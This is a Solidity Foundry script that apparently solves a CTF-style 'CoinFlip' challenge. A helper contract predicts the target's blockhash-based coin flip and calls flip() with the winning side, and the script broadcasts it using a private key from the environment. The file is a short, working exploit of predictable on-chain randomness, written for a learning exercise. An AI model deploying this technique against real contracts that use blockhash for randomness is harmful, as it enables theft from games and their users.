// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level3.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Play {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip public coinflipInstance =
        CoinFlip(0x68BD3bb42c3D5A08a8e38715Ec46Fd87eF71914E);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Play(coinflipInstance);
        console.log("win?:", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
